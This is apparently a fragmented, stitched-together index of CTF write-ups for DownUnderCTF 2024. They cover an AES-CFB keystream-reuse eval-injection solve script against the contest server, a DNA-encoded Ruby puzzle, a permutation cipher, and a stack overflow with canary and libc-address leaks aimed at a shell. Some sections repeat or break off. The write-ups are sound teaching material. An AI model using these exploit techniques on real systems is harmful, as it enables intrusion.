Please use your magical malleability mastership to retrieve the flag!

Whenever element of a collection is referenced by number , 0-based index implied. Ie, element 0 of list [1, 2, 4, 8, 16] is 1 , Element 3 is 8 . When element is reference in explanation with word (first, third...), 1-based system is implied. Ie, first character of string Hello World! is H , fifth is o . Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin My struggle \u00b6 Analysis \u00b6 We got only one file to start with: 1 2 3 4 5 6 7 8 9 10 11 12 KEY = os . urandom ( 16 ) # AES params IV = os . urandom ( 16 ) FLAG = os . getenv ( 'FLAG' , 'DUCTF {testflag} ' ) # flag variable this will be our target def main (): while True : ct = bytes . fromhex ( input ( 'ct: ' )) # read input string aes = AES . new ( KEY , AES . MODE_CFB , IV , segment_size = 128 ) # create AES cipher try : print ( eval ( aes . decrypt ( ct ))) # decrypt input string, evaluate result value except Exception : print ( 'invalid ct!' ) Our goal is to get aes.decrypt return string FLAG , then evaluation of it will print value of the FLAG variable back to us. AES is considered to be a secure algorithm. If its used correctly - its practically unbreakable. The key part of this statement is \"if used correctly\". The key issue of the implementation is that it AES.new is created afresh for every user input. Given IV and KEY are same every time, same cipher keystream is generated for each input. Combined with the fact that CFB mode is used, we can control result of decryption even though we will never know values of KEY and IV . Lets review strategy of controlling output of AES description in CFB mode when same keystream is applied to every input that we provide. Program executes following algorithm: Read used input; Generate same keystream every time for given KEY nad IV XOR input with keystream Evaluate result If expression is evaluated successfully - print result, otherwise print \"invalid ct!\" If we know the keystream, we can easily construct input that will give us any desired output. For example if first keystream byte was 0x67 and we would want it to be 'F' (ascii value 0x46) then input we are lookign for is 0x67 ^ 0x46 = 0x21 . Same calculation works for any other byte value of the keystream. Attempt 1 \u00b6 How would we find the keystream? My first idea was to loop through all possible inputs until I get first and last characters to be double quotes, then everything is the middle will be considered as string that will be printed back. Once I have bytes the middle, I can calculate input. Pseudocode that I used for this: attempt_1.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 input = [ 0 ] * 16 # this is our input 16 bytes long (source code mentioned segment size 128) # when same byte of keystream is XOR-ed with 256 different values in input # output will also cover 256 possible values # one of them will be double quote that I am looking for for i in range ( 256 ): # try all possible first bytes for j in range ( 256 ): # try all possible last bytes input [ 0 ] = i # set first byte to i, last byte to j, all others will be 0 input [ 15 ] = j io . sendline ( binascii . hexlify ( bytearray ( input ))) # send input to the decrypt-eval program response = io . recvline () . strip () # read result line # if we got something interesting - print it, I expect to double quoted string and single quoted # and maybe some other inputs that are randomly valid if b 'invlaid ct!' not in line : print ( \"We received response that is not error: \" , line ) I've run the program and to my surprise I got nothing. There must be some other evaluation errors. I've modified source code of the decrypt-eval program to include more debug information printed while keeping functionality intact and increasing performance. With this version I can iterate much quicker: modified decrypt-then-eval.py 1 2 3 4 5 6 7 8 9 10 aes = AES . new ( KEY , AES . MODE_CFB , IV , segment_size = 128 ) # create AES instance at the start of the program keysream = aes . decrypt ( bytearray ( 16 )) # by using input [0,0,0,0....0] extract keystream def main (): while True : ct = bytes . fromhex ( input ( 'ct: ' )) try : print ( eval ( xor_arrays ( keysream , ct ))) # xor keystream with provided input except Exception as e : print ( 'invalid ct!' , e ) # add exception details to the message Once I rerun my enumeration script I found errors of the eval: source code string cannot contain null bytes; invalid utf8 encoding Looks like there is a bad sequence of bytes somewhere in the middle of the string. So far, all input middle bytes were 0. I think we should try different value to deal with encoding problems. For nullbyte error we should try both 0 and 1 as input (only one may produce null-byte, not both at the same time). Pair 127,128 should take care of invalid UTF-8 sequence. UTF8 encoded characters are variable length byte sequences. It means that frequently used characters like latin alphabet, digits will take only 1 byte, and some less frequently used (emoji etc) assign 2-3 byte sequences. Decoding process is quite straightforward: first bit has a special meaning, its a flag indicating that current byte is final byte of codepoint. Remaining bits are concatenated to form codepoint value. For example: 1 2 3 4 0XXXXXXX -> 1 byte sequence, codepoint is XXXXXXX 1AAAAAAA 0BBBBBBB -> 2 byte sequence codepoints is AAAAAAABBBBBBB 1AAAAAAA 1BBBBBBB 0CCCCCCC -> 3 byte sequence codepoint is AAAAAAABBBBBBBCCCCCCC ... 1 byte UTF-8 symbols are all defined (matches ascii table for backwards compatibility), 2+ byte sequences have gaps and not every codepoint is defined (ie valid). This is where we get encoding errors. If all characters were 1byte sequences, we would not have undefined codepoints error. Pair 127, 128 should take care of it - flips highes bit, therefore we can reach a sequence in output where every byte is starting with 0 and is not a null-byte. The resulting candidate values to try for input bytes 1..14 are [0, 1, 127, 128] . Attempt 2 \u00b6 Here is script to enumerate through all values 0..255 for bytes 0 and 15, and vocabulary [0, 1, 127, 128] for bytes 1..14 as discussed earlier to deal with encoding errors. Feel free to skip implementation of the function input_generator as long as you understand the sequence that its producing and reasoning why we want this sequence (I think implementation is not too important for understanding the challenge). Loop in the end of the snippet is mostly the same as before. attempt_2.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 # Generate sequence of states: # [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # [1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # ... # [255, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # [0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # [1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # ... # [256, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # [0, 127, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # [1, 127, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0] # ... def input_generator (): state = [ 0 ] * 16 possible_values = [ range ( 256 ) if i == 0 or i == 15 else [ 0 , 1 , 127 , 128 ] for i in range ( 16 )] while True : yield [ possible_values [ i ][ state [ i ]] for i in range ( len ( state ))] for i in range ( len ( state )): if state [ i ] < len ( possible_values [ i ]) - 1 : state [ i ] += 1 break else : if i == len ( state ) - 1 : return state [ i ] = 0 for state in input_generator (): io . sendline ( binascii . hexlify ( bytearray ( state ))) # send input to local bynary response = io . recvline () . strip () # read result line # if we got something interesting - print it, I expect to double quoted string and single quoted # and maybe some other inputs that are randomly unique if b 'invlaid ct!' not in line : print ( \"We received response that is not error: \" , line ) While the script is running I had some time (actually quite a lot of time) to calculate total number of iterations. The formula is trivial: number of possible values for byte 0 * number of possible values for byte 1 * number of values for byte 2 * ... 256 * (4 ** 14) * 256 = 17592186044416 No wonder it takes a lot of time! Immediate thought was to reduce number of states for bytes 1..14 from [0, 1, 127, 128] to [0, 128] , unless we are very unlucky this should also work. Its also easy to update the script. But it doesn't seem to be enough. On the second thought, I am running against local application that performs no cryptography, but only XOR of two arrays. Its magnitudes faster than remote script. Therefore, proper solution should finish locally under few seconds. Besides that, all heavy lifting of cryptography is done on the server side, its very unlikely author expects all teams to run thousands of cryptography iterations each, this would be nontrivial question for scalability/costs. Attempt 3 \u00b6 My new idea for desired output: first byte is digit, second byte is # , other bytes doesn't matter as they will be treated as comment and hence ignored. Complexity of native implementation of such algorithm would be 256*256 , but I am sure given all digits are consecutive in ascii table and any of them works for us, there is a smart lookup of first byte that will reduce algorithm complexity to 25*256 iterations. Quick prototyping only to got me a disappointing discovery: value for eval should be a valid python source file without nullbytes and invalid codepoints, even if its a comment. At this moment it became clear that I am looking in the wrong direction. Therefore, I went back to the task description and original source code. Then it struck me: CFB is a stream cipher, it means I can provide as little as 1 byte and output will also be 1 byte (compared to block ciphers that even for 1 byte input are adding padding and produce fixed blocks of output). Attempt 4 \u00b6 Algorithm: Iterate through all possible values of byte 0 (0..255) until we receive digit as an output; Calculate keystream byte using formula k[i] = input[i] ^ ord(output[i]) Calculate input for byte 0 that will produce a space as output using formula input[0] = k[0] ^ ord(' ') Use value from step 3 as prefix, repeat step 1-3 to calculate other keystream bytes. Now we can calculate input that will produce FLAG : input[0] = k[i] ^ ord('F') , input[1] = k[1] ^ ord('L') . Complexity of the algorithm is 4*256 iterations. solve.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 from pwn import * if args [ 'REMOTE' ]: remote_server = '2024.ductf.dev' remote_port = 30020 io = remote ( remote_server , remote_port ) else : io = process ([ \"python\" , \"decrypt-then-eval.py\" ]) keystream = [] # store keystream values we idenitified so far for j in range ( 4 ): # we will repeat for 4 bytes for i in range ( 256 ): # try all possible values for next byte io . recvuntil ( b ': ' ) # wait for decrypt-then-eval.py to init # use keystream prefix XORed with space (eval trims spaces) as prefix # and append candidate value of next input `i` io . sendline ( binascii . hexlify ( bytearray ([ p ^ ord ( ' ' ) for p in keystream ]) + i . to_bytes ())) # read result line = io . recvline () . strip () if b 'invalid ct!' not in line : # if not error if line == b '0' : # if result is 0, technically we can stop on any digit, but its not a substantial difference keystream . append ( i ^ ord ( '0' )) # append keystream value we found break # on the the next byte io . recvuntil ( b ': ' ) # calculate input that once decrypted produces FLAG payload = bytearray ([ keystream [ 0 ] ^ ord ( 'F' ), keystream [ 1 ] ^ ord ( 'L' ), keystream [ 2 ] ^ ord ( 'A' ), keystream [ 3 ] ^ ord ( 'G' )]) io . sendline ( binascii . hexlify ( payload )) flag = io . recvline () . strip () print ( f ' { flag =} ' ) io . close () Epilogue \u00b6 Official website: https://downunderctf.com/ Official writeups: https://github.com/DownUnderCTF/Challenges_2024_Public","title":"Decrypt then eval"},{"location":"decrypt_eval/#prologue","text":"Difficulty: easy Category: cryptography Solved: 197 Description This server decrypts user input and evaluates it.

Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin My struggle \u00b6 Disclaimer : this is the first time I've opened ruby script, therefore technique is primitive and far from optimal. At this point I can't tell if file we were given is a valid ruby script or first we have to decode the DNA it somehow before running. There is only one searchable string to start with: require \"doublehelix\" (I don't believe googling all those AT TA can be helpful). Quickly landed at following library on github https://github.com/mame/doublehelix . Entire encoding and decoding is implemented in less than 20 lines : source code of doublehelix.rb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $code = \"\" Object . instance_eval do def const_missing ( s ); $code << s . to_s ; 0 ; end remove_const ( :GC ) # Holy moly! end at_exit do dict = { \"AT\" => \"00\" , \"CG\" => \"01\" , \"GC\" => \"10\" , \"TA\" => \"11\" } eval ( [ $code . gsub ( /../ ) { | s | dict [ s ] } ]. pack ( \"b*\" )) end def doublehelix ( src ) dict = { \"00\" =>[ \"A\" , \"T\" ] , \"01\" =>[ \"C\" , \"G\" ] , \"10\" =>[ \"G\" , \"C\" ] , \"11\" =>[ \"T\" , \"A\" ] } format = [[ 1 , 0 ] , [ 0 , 2 ] , [ 0 , 3 ] , [ 0 , 4 ] , [ 1 , 4 ] , [ 2 , 4 ] , [ 3 , 3 ] , [ 4 , 2 ] , [ 5 , 0 ]] format += format . reverse %(require \"doublehelix\" \\n\\n ) + src . unpack ( \"b*\" ) . first . gsub ( /../ ) do | s | format << ( offset , dist = format . shift ) \" \" * offset + dict [ s ] * ( \"-\" * dist ) + \" \\n \" end end I wasn't able to install the package in my machine and run hello world (probably my environment is not properly set up). But, replacing require \"doublehelix\" with contents of the library did the trick. After that I've tried to run source code that we were given in the challenge. Of cause, it was not so easy: task description mentions but it seems to have corrupted. Can you help me recover this research? So we have to fix the script first. At lines 7 and 12 of the source code we can see that there are only 4 possible pairs of gens (AT, CG, GC, TA). As a first path I went through the script and repaired all lines that included 1 letter: lines with A should have T lines with T should have A liens with C should have G lines with G should have C Its easy to pick a sequence to use (for example AT or TA) visually (fit DNA picture). Now lets work on empty lines. We will have to guess what it is. For that I've added few modifications: modied dna.rb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 $code = \"\" Object . instance_eval do def const_missing ( s ); $code << s . to_s ; 0 ; end remove_const ( :GC ) # Holy moly! end at_exit do # extended dictianary with 4 new gens: V0, V1, V2, V3 that produce same bits as existing ones # now I can enter my guesses and still able to distinct given input from my guesses dict = { \"AT\" => \"00\" , \"CG\" => \"01\" , \"GC\" => \"10\" , \"TA\" => \"11\" , \"V0\" => \"00\" , \"V1\" => \"01\" , \"V2\" => \"10\" , \"V3\" => \"11\" } # print concatenated source code for debug purposes puts $code res = [ $code . gsub ( /../ ) { | s | dict [ s ] } ] # print decoded bits for debug purposes puts res puts res . pack ( \"b*\" ) end def doublehelix ( src ) dict = { \"00\" =>[ \"A\" , \"T\" ] , \"01\" =>[ \"C\" , \"G\" ] , \"10\" =>[ \"G\" , \"C\" ] , \"11\" =>[ \"T\" , \"A\" ] } format = [[ 1 , 0 ] , [ 0 , 2 ] , [ 0 , 3 ] , [ 0 , 4 ] , [ 1 , 4 ] , [ 2 , 4 ] , [ 3 , 3 ] , [ 4 , 2 ] , [ 5 , 0 ]] format += format . reverse %(require \"doublehelix\" \\n\\n ) + src . unpack ( \"b*\" ) . first . gsub ( /../ ) do | s | format << ( offset , dist = format . shift ) \" \" * offset + dict [ s ] * ( \"-\" * dist ) + \" \\n \" end end # removed all spaces and punctuation symbols as it was giving errors and not used in decoding anyway AT AT TA GC GC ...

I am using gdb with pwndbg plugin","title":"Prologue"},{"location":"dna/#my-struggle","text":"Disclaimer : this is the first time I've opened ruby script, therefore technique is primitive and far from optimal. At this point I can't tell if file we were given is a valid ruby script or first we have to decode the DNA it somehow before running. There is only one searchable string to start with: require \"doublehelix\" (I don't believe googling all those AT TA can be helpful). Quickly landed at following library on github https://github.com/mame/doublehelix . Entire encoding and decoding is implemented in less than 20 lines : source code of doublehelix.rb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 $code = \"\" Object . instance_eval do def const_missing ( s ); $code << s . to_s ; 0 ; end remove_const ( :GC ) # Holy moly! end at_exit do dict = { \"AT\" => \"00\" , \"CG\" => \"01\" , \"GC\" => \"10\" , \"TA\" => \"11\" } eval ( [ $code . gsub ( /../ ) { | s | dict [ s ] } ]. pack ( \"b*\" )) end def doublehelix ( src ) dict = { \"00\" =>[ \"A\" , \"T\" ] , \"01\" =>[ \"C\" , \"G\" ] , \"10\" =>[ \"G\" , \"C\" ] , \"11\" =>[ \"T\" , \"A\" ] } format = [[ 1 , 0 ] , [ 0 , 2 ] , [ 0 , 3 ] , [ 0 , 4 ] , [ 1 , 4 ] , [ 2 , 4 ] , [ 3 , 3 ] , [ 4 , 2 ] , [ 5 , 0 ]] format += format . reverse %(require \"doublehelix\" \\n\\n ) + src . unpack ( \"b*\" ) . first . gsub ( /../ ) do | s | format << ( offset , dist = format . shift ) \" \" * offset + dict [ s ] * ( \"-\" * dist ) + \" \\n \" end end I wasn't able to install the package in my machine and run hello world (probably my environment is not properly set up). But, replacing require \"doublehelix\" with contents of the library did the trick. After that I've tried to run source code that we were given in the challenge. Of cause, it was not so easy: task description mentions but it seems to have corrupted. Can you help me recover this research? So we have to fix the script first. At lines 7 and 12 of the source code we can see that there are only 4 possible pairs of gens (AT, CG, GC, TA). As a first path I went through the script and repaired all lines that included 1 letter: lines with A should have T lines with T should have A liens with C should have G lines with G should have C Its easy to pick a sequence to use (for example AT or TA) visually (fit DNA picture). Now lets work on empty lines. We will have to guess what it is. For that I've added few modifications: modied dna.rb 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 $code = \"\" Object . instance_eval do def const_missing ( s ); $code << s . to_s ; 0 ; end remove_const ( :GC ) # Holy moly! end at_exit do # extended dictianary with 4 new gens: V0, V1, V2, V3 that produce same bits as existing ones # now I can enter my guesses and still able to distinct given input from my guesses dict = { \"AT\" => \"00\" , \"CG\" => \"01\" , \"GC\" => \"10\" , \"TA\" => \"11\" , \"V0\" => \"00\" , \"V1\" => \"01\" , \"V2\" => \"10\" , \"V3\" => \"11\" } # print concatenated source code for debug purposes puts $code res = [ $code . gsub ( /../ ) { | s | dict [ s ] } ] # print decoded bits for debug purposes puts res puts res . pack ( \"b*\" ) end def doublehelix ( src ) dict = { \"00\" =>[ \"A\" , \"T\" ] , \"01\" =>[ \"C\" , \"G\" ] , \"10\" =>[ \"G\" , \"C\" ] , \"11\" =>[ \"T\" , \"A\" ] } format = [[ 1 , 0 ] , [ 0 , 2 ] , [ 0 , 3 ] , [ 0 , 4 ] , [ 1 , 4 ] , [ 2 , 4 ] , [ 3 , 3 ] , [ 4 , 2 ] , [ 5 , 0 ]] format += format . reverse %(require \"doublehelix\" \\n\\n ) + src . unpack ( \"b*\" ) . first . gsub ( /../ ) do | s | format << ( offset , dist = format . shift ) \" \" * offset + dict [ s ] * ( \"-\" * dist ) + \" \\n \" end end # removed all spaces and punctuation symbols as it was giving errors and not used in decoding anyway AT AT TA GC GC ...

Goal is to find such numbers that result won't fit into the register and when truncated will be equal to dividend.

To experiment locally I've compiled the code above gcc -o number-mashing number-mashing.c . After a bit trial and error within constraints that second cannot be large number, in fact only -1 makes sense (and maybe 2 if we treat divide by two as shift right where flag bit is carried). And first number should have top bits sets, so they will be truncated by flag bit.

I am using gdb with pwndbg plugin My struggle \u00b6 First things first - review source code of the script that ciphers data. Explanation for relevant parts of the code added as comments: shuffle.py with comments 1 2 3 4 5 6 7 8 9 10 11 12 13 14 PERM = list ( range ( 16 )) # create list of 16 elements 0, 1, 2, 3 ... 16 random . shuffle ( PERM ) # shuffle elements of the list in a random order, so now we have something like 15, 3, 1, 6 ... # key tranformation logic # PERM shuffle list is used as array of indices # For example if PERM was a list of 4 elements [2, 0, 3, 1] # then result string will first output charcter 2 then 0 and so on, ie 'abcd' -> 'cadb' def apply_perm ( s ): assert len ( s ) == 16 return '' . join ( s [ PERM [ p ]] for p in range ( 16 )) for line in open ( 0 ): # for each line of input apply transformation and print input and output line = line . strip () print ( line , '->' , apply_perm ( line )) Import note to make is that internal state of the cipher algorithm doesn't change and there is no nonce. In other words if we can infer PERM list from one line, we can recover all other inputs. Now that we understand how cipher algorithm works, lets review output file: output_censored.txt 1 2 3 aaaabbbbccccdddd -> ccaccdabdbdbbada abcdabcdabcdabcd -> bcaadbdcdbcdacab ???????????????? -> owuwspdgrtejiiud Looking at the first line we immediately spot the problem - there are 4 'a' in the input so we can't immediately tell where it was. Based on the first line aaaabbbbccccdddd -> ccaccdabdbdbbada , first character is moved in one of the following positions: [0] -> [2, 6, 13, 15] Given all rows are transformed exactly the same, we can use second row to narrow down positions of the first character: abcdabcdabcdabcd -> bcaadbdcdbcdacab : first character is moved into one of the following positions: [0] -> [2, 3, 12, 14] Now we can compare this two lists and see that only value 2 is present in both. Hence, first character of input is third character of output. Ie our answer will start with u . Although this problem can be solved by hand, I wrote a short stripe to print out all possible positions for each character of the input (although we were lucky with first character and found exact position, it is possible that for some positions we may have several candidates). 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 in1 = \"aaaabbbbccccdddd\" out1 = \"ccaccdabdbdbbada\" in2 = \"abcdabcdabcdabcd\" out2 = \"bcaadbdcdbcdacab\" resolved_positions = [ - 1 ] * 16 for i in range ( 16 ): # iterate over each position 0..15 and analyze what a resulting possible positions (aka candidates) candidates = [] for j in range ( 16 ): # if input character at position i is same as output character at position j for both lines # then this position j is one of candidate shuffles if out1 [ j ] == in1 [ i ] and out2 [ j ] == in2 [ i ]: candidates . append ( j ) print ( i , candidates ) if len ( candidates ) == 1 : # if number of candidates is 1, then we uniquely identifies transformation and can store it resolved_positions [ i ] = candidates [ 0 ] output 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 0 [2] 1 [15] 2 [13] 3 [6] 4 [12] 5 [9] 6 [7] 7 [11] 8 [3] 9 [0] 10 [1] 11 [4] 12 [14] 13 [5] 14 [10] 15 [8] This means that character 0 of answer is owuwspdgrtejiiud[2] , character 1 is owuwspdgrtejiiud[1] and so on.

So seems like we should start by decoding the message. Article itself is not too friendly and doesn't explain much (too many technical words without definition for my liking), but there is important bit: CCIR476 encodes each character as 7-bits.

I am using gdb with pwndbg plugin My struggle \u00b6 Analysis \u00b6 This is one of the most straightforward challenges that is a good introduction to binary exploitation.

We can test this theory and find locations of global variables by inspecting the binary.

Solution code was redacted for readability purposes. Due to time pressure during the competition I was using a lot of one-letter variables and questionable code structure. I am using gdb with pwndbg plugin My struggle \u00b6 Task includes binary(with libc library and ld linker to run it) and source code. First thing I review source code to build a plan. There is no win() function or equivalent so we likely have to get RCE (shell or similar). Source code is so short that it don't take long to find a bug in code that we can exploit: 1 2 3 4 5 6 7 8 9 10 11 12 13 char name [ 88 ]; # desclare variable name int choice ; while ( 1 ) { choice = menu (); if ( choice == 1 ) { read ( 0 , name , 0x88 ); # read input into variable name } else if ( choice == 2 ) { printf ( \"Hello, %s \\n \" , name ); } else { break ; } } Variable name is a buffer of 88 characters, but read(0, name 0x88) reads up to 0x88 = 136 characters. Means we can overflow stack and get code execution. Now that we know what to do lets check what type of binary we have and what types of protection are enabled: 1 2 3 4 5 6 7 8 9 10 11 12 13 $ file yawa yawa: ELF 64 -bit LSB pie executable, x86-64, # 64-bit version 1 ( SYSV ) , dynamically linked, interpreter ./ld-linux-x86-64.so.2, for GNU/Linux 3 .2.0, BuildID [ sha1 ]= 7f7b72aaab967245353b6816808804a6c4ad2168, not stripped $ checksec --file = yawa RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY Fortified Fortifiable FILE Full RELRO Canary found NX enabled PIE enabled No RPATH RW-RUNPATH 45 Symbols No 0 2 yawa So, we have full package: Canary stack protection - stack is protected from overwrites; NX enabled - stack is not executable; PIE enabled - every time you run the file it gets loaded into a different memory address. If you are not familiar with any of above techniques and would like to learn about them (I am going to briefly touch them, but there is goal to include in-detail explanation of each of the techniques in this writeup) I recommend reading following gitbook notes: https://ir0nstone.gitbook.io/notes . This is by a long shot the best resource I have seen on internet on the topic both quality of explanation and completeness of content is superb. Next I use pwninit to be able to run binary on my machine without need to juggle with environment variable paths etc: 1 $ pwninit --bin yawa --libc ./libc.so.6 Exploit algorithm: Leak canary value from stack to bypass canary protection; Leak libc address to find system call; Use buffer overflow to get remote shell and obtain flag. Here is sample memory layout of stack that we will be working with: Memory layout 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 0x7fffffffdc60: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc68: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc70: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc78: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc80: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc88: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc90: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdc98: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdca0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdca8: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdcb0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdcb8: 0x00 0x87 0x60 0x15 0x3c 0x9c 0x6f 0x4b 0x7fffffffdcc0: 0x01 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x7fffffffdcc8: 0x90 0x9d 0xc2 0xf7 0xff 0x7f 0x00 0x00 0x7fffffffdcd0: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 Variable name is stored at address 0x7fffffffdc60 (line 1). Canary value is stored at address 0x7fffffffdcb8 (line 12), it always ends with 0x00 on linux (remember - its little endian). Therefore, its value is 0x4b6f9c3c15608700. At address 0x7fffffffdcb8 we see some 8byte long number 1 (not sure what it is - I've left it untouched in my work). At address 0x7fffffffdcc8 (line 14) we see return address from the main function (0x00007ffff7c29d90), here we want to place jump to system call. Leak canary value \u00b6 Canary protection (read more here ) puts a random value on stack before execution and checks if hasn't been modified while function was running (if it is - program exits). If we want overwrite return address at 0x7fffffffdcc8, by overflowing variable name at 0x7fffffffdc60, we will have overwrite canary address at 0x7fffffffdcb8 as we can only write continues block of memory. Therefore, we will have to leak canary value from stack and when we overflow buffer put exactly same bytes in the same place to prevent canary protection from triggering. To leak address we can take advantage of \"print your name functionality\": 1 2 3 } else if ( choice == 2 ) { printf ( \"Hello, %s \\n \" , name ); } %s modifier of printf prints all bytes starting from address name until it reaches nullbyte. So if we put 'a' from 0x7fffffffdc60 till 0x7fffffffdcb8, it is going to print aaaaa... and won't stop just on 'a' (as there is no nullbyte) it will continue printing up until 0x7fffffffdcc0 (including entire canary value) and then stop: leak canary block 1 2 3 4 5 6 7 8 9 10 11 12 # 'io' is pwntools input/output pipe object that connected to process or remote server def get_canary_value (): io . recvuntil ( b \"> \" ) # wait till target binary initialises io . sendline ( b \"1\" ) # send choice 1 - enter value for name io . sendline ( b \"a\" * 88 ) # enter our name 88 a + '\\n' (newline char appended by function sendline - it will overwrite nullbyte of canary) io . recvuntil ( b \"> \" ) # wait till binary asks us to make a choice io . sendline ( b \"2\" ) # send choice 2 - print name value io . recvline () # receive all aaaa... till '\\n' addr_raw = io . recvline () . strip () # receive canary value in little endian order addr_raw = bytearray ( 1 ) + addr_raw # append nullbyte that we skipped return unpack ( addr_raw [ 0 : 8 ]) # convert to little endian byte array number Leak libc address \u00b6 Next step is to find base virtual address of libc, so we can find system call. Address on stack of return address from our main function is address of __libc_start_call_main - as you might guess its inside libc library. To read address of the function, we can use same technique as we used previously to reading canary value. When library is loaded into memory, its loaded as a single blob, so even though virtual location will be different each time, blob content is always same. Therefore we can calculate position of elements inside the library relative to each other and it won't change doesn't matter where library is loaded: 1 2 3 4 $ readelf -s ./libc.so.6 | grep __libc_start_cal 6 : 0000000000029d10 172 FUNC LOCAL DEFAULT 15 __libc_start_cal [ ... ] $ readelf -s libc.so.6 | grep system 8412 : 0000000000050d70 45 FUNC WEAK DEFAULT 15 system This means that system function will be always 0x50d70-0x29d10 = 0x27060 bytes apart from __libc_start_call_main function. For our our sample memory dump we saw return address 0x7ffff7c29d90 - we return to the middle of libc_start_call_main , so we can infer that libc library is mapped to address 0x7ffff7c29d90 - 0x29d90 = 0x7ffff7c00000 (segments are typically round numbers). So system address is 0x7ffff7c00000 + 0x50d70 = 0x7ffff7c50d70 . We can also double check our calculations by checking process memory mapping using gdb or cat: gdb debugger bash 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 pwndbg> info proc mappings process 19607 Mapped address spaces: Start Addr End Addr Size Offset Perms objfile 0x555555554000 0x555555555000 0x1000 0x0 r--p /home/kali/Downloads/yawa_s/yawa_patched 0x555555555000 0x555555556000 0x1000 0x1000 r-xp /home/kali/Downloads/yawa_s/yawa_patched 0x555555556000 0x555555557000 0x1000 0x2000 r--p /home/kali/Downloads/yawa_s/yawa_patched 0x555555557000 0x555555558000 0x1000 0x2000 r--p /home/kali/Downloads/yawa_s/yawa_patched 0x555555558000 0x55555555b000 0x3000 0x3000 rw-p /home/kali/Downloads/yawa_s/yawa_patched 0x7ffff7c00000 0x7ffff7c28000 0x28000 0x0 r--p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7c28000 0x7ffff7dbd000 0x195000 0x28000 r-xp /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7dbd000 0x7ffff7e15000 0x58000 0x1bd000 r--p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7e15000 0x7ffff7e16000 0x1000 0x215000 ---p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7e16000 0x7ffff7e1a000 0x4000 0x215000 r--p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7e1a000 0x7ffff7e1c000 0x2000 0x219000 rw-p /home/kali/Downloads/yawa_s/libc.so.6 0x7ffff7e1c000 0x7ffff7e29000 0xd000 0x0 rw-p 0x7ffff7fb8000 0x7ffff7fbd000 0x5000 0x0 rw-p 0x7ffff7fbd000 0x7ffff7fc1000 0x4000 0x0 r--p [ vvar ] 0x7ffff7fc1000 0x7ffff7fc3000 0x2000 0x0 r-xp [ vdso ] 0x7ffff7fc3000 0x7ffff7fc5000 0x2000 0x0 r--p /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffff7fc5000 0x7ffff7fef000 0x2a000 0x2000 r-xp /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffff7fef000 0x7ffff7ffa000 0xb000 0x2c000 r--p /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffff7ffb000 0x7ffff7ffd000 0x2000 0x37000 r--p /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffff7ffd000 0x7ffff7fff000 0x2000 0x39000 rw-p /home/kali/Downloads/yawa_s/ld-2.35.so 0x7ffffffde000 0x7ffffffff000 0x21000 0x0 rw-p [ stack ] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 cat /proc/19607/maps 555555554000 -555555555000 r--p 00000000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 555555555000 -555555556000 r-xp 00001000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 555555556000 -555555557000 r--p 00002000 08 :01 1212715 /home/kali/Downloads/yawa_s/yawa_patched 555555557000 -555555558000 r--p 00002000 08 :01 1212715 